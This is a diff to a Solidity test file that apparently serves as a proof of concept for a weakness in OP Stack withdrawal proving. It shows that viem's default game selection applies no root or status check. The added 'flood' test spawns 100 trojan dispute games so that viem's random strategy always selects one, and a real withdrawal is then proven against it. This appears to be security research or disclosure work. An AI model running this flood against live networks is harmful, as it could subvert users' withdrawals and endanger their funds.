@@ -44,6 +44,7 @@ contract AtkDTrojanTest is Test {
     bytes32[] whs;
     OutputRootProof[] orps;
     bytes[][] wproofs;
+    WithdrawalTransaction fw; bytes32 fwh; OutputRootProof forp; bytes[] fproof; uint256 fts;
     uint256 minSeq; // timestamp covered by the game the auto-prover actually used (21314) >= every withdrawal's L2 ts
 
     function setUp() public {
@@ -65,13 +66,32 @@ contract AtkDTrojanTest is Test {
                 vm.parseJsonBytes32(p, string.concat(key, ".storageRoot")), vm.parseJsonBytes32(p, string.concat(key, ".blockHash"))));
             wproofs.push(vm.parseJsonBytesArray(p, string.concat(key, ".proof")));
         }
+        string memory f = vm.readFile("fresh.json");
+        fw = WithdrawalTransaction(vm.parseJsonUint(f, ".nonce"), vm.parseJsonAddress(f, ".sender"), vm.parseJsonAddress(f, ".target"),
+            vm.parseJsonUint(f, ".value"), vm.parseJsonUint(f, ".gasLimit"), vm.parseJsonBytes(f, ".data"));
+        fwh = vm.parseJsonBytes32(f, ".wh");
+        assertEq(fwh, keccak256(abi.encode(fw.nonce, fw.sender, fw.target, fw.value, fw.gasLimit, fw.data)));
+        forp = OutputRootProof(bytes32(0), vm.parseJsonBytes32(f, ".stateRoot"), vm.parseJsonBytes32(f, ".storageRoot"), vm.parseJsonBytes32(f, ".blockHash"));
+        fproof = vm.parseJsonBytesArray(f, ".proof");
+        fts = vm.parseJsonUint(f, ".l2ts");
         (,, address g21314) = DGF.gameAtIndex(21314);
         minSeq = IGame(g21314).l2SequenceNumber();
     }
 
     // ---- faithful re-implementations of the official selectors (read-only) ----
-    /// viem 2.58.0 op-stack getGames+getGame(strategy 'latest'): findLatestGames(respected, count-1, 100),
-    /// keep l2SequenceNumber >= l2Timestamp, return games[0]. No root/status check.
+    /// viem 2.58.0 op-stack getGames: findLatestGames(respected, count-1, 100), keep l2SequenceNumber >= l2Timestamp.
+    /// waitToProve -> waitForNextGame -> getGame(strategy 'random') draws UNIFORMLY from this pool (docs-default
+    /// prove flow); getGame's default strategy 'latest' returns pool[0]. No root / status / canonicality check.
+    function viemPool(uint256 l2Ts) internal view returns (uint256[] memory pool) {
+        uint256 n = DGF.gameCount();
+        GameSearchResult[] memory gs = DGF.findLatestGames(PORTAL.respectedGameType(), n - 1, 100);
+        pool = new uint256[](gs.length);
+        uint256 m;
+        for (uint256 i; i < gs.length; i++) {
+            if (IGame(address(uint160(uint256(gs[i].metadata)))).l2SequenceNumber() >= l2Ts) pool[m++] = gs[i].index;
+        }
+        assembly { mstore(pool, m) }
+    }
     function viemSelect(uint256 l2Ts) internal view returns (uint256) {
         uint256 n = DGF.gameCount();
         GameSearchResult[] memory gs = DGF.findLatestGames(PORTAL.respectedGameType(), n - 1, 100);
@@ -134,9 +154,14 @@ contract AtkDTrojanTest is Test {
         assertEq(trojan.rootClaimByChainId(10), R);
         assertTrue(trojan.rootClaim() != honest.rootClaim());
 
-        // post: both official selectors now return the trojan (viem: no root check; op-node: root check passes)
+        // post: op-node/op-chain-ops CLI (latest + root check) deterministically returns the trojan;
+        // viem 'latest' returns it; viem 'random' (docs flow) for the fresh withdrawal draws from {trojan, 21388, 21387}
         assertEq(viemSelect(minSeq), tIdx);
         assertEq(opnodeSelect(minSeq, R), tIdx);
+        uint256[] memory pool = viemPool(fts);
+        assertEq(pool.length, 3);
+        assertEq(pool[0], tIdx);
+        console.log("viem random pool size for fresh withdrawal (p_trojan = 1/size)", pool.length);
 
         // victims prove with honest, unmodified viem-built parameters at the selected index
         vm.warp(block.timestamp + 12);
@@ -226,6 +251,36 @@ contract AtkDTrojanTest is Test {
         this.extOpnodeSelect(minSeq, hr);
     }
     function extOpnodeSelect(uint256 a, bytes32 b) external view returns (uint256) { return opnodeSelect(a, b); }
+
+    /// Flood: 100 trojans (one honest proposal's worth) push every honest covering game out of viem's 100-game
+    /// window, so the docs-default viem 'random' draw selects a trojan with certainty.
+    function test_flood_viem_random_pool_all_trojans() public {
+        IGame honest = _game(HONEST_IDX);
+        bytes memory hx = honest.extraData();
+        vm.startPrank(attacker);
+        vm.deal(attacker, 20 ether);
+        TrojanBot bot = new TrojanBot(DGF);
+        uint256 b0 = attacker.balance;
+        for (uint256 i; i < 100; i++) {
+            bot.strike{ value: 0.2 ether }(abi.encodePacked(hx, uint256(999), keccak256(abi.encode(i))), bytes32(uint256(0xc0ffee)));
+        }
+        bot.sweep();
+        vm.stopPrank();
+        console.log("flood capital locked (wei, recoverable if counters are honest)", b0 - attacker.balance);
+        uint256[] memory pool = viemPool(fts);
+        assertEq(pool.length, 100);
+        for (uint256 i; i < pool.length; i++) {
+            assertEq(_game(pool[i]).rootClaimByChainId(10), honest.rootClaimByChainId(10));
+            assertTrue(_game(pool[i]).rootClaim() != honest.rootClaim());
+        }
+        // the fresh real withdrawal, built exactly like viem buildProveWithdrawal, proves against any pool member
+        uint256 pick = pool[uint256(keccak256("viem Math.random")) % pool.length];
+        vm.warp(block.timestamp + 12);
+        vm.prank(viemUser);
+        PORTAL.proveWithdrawalTransaction(fw, pick, forp, fproof);
+        (address g,) = PORTAL.provenWithdrawals(fwh, viemUser);
+        assertEq(g, address(_game(pick)));
+    }
 
     /// Duplicate-chain variant and an attacker-chosen unsorted list are also accepted (first match wins).
     function test_duplicate_variant() public {
